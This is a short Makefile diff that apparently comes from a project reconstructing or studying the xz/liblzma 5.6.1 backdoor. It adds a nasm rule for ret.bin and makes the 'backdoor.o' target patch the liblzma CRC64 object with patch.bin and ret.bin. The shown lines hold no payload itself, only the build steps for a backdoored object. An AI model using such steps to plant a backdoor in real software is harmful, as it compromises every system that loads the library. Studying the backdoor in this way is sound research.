@@ -15,7 +15,10 @@ libsystemd.so: libsystemd.o
 patch.bin: patch.asm
 	nasm $< -o $@
 
-backdoor.o: patch.bin
+ret.bin: ret.asm
+	nasm $< -o $@
+
+backdoor.o: patch.bin ret.bin
 	./patch liblzma_la-crc64-fast-5.6.1.o
 
 %.so: override CPPFLAGS += -fPIC
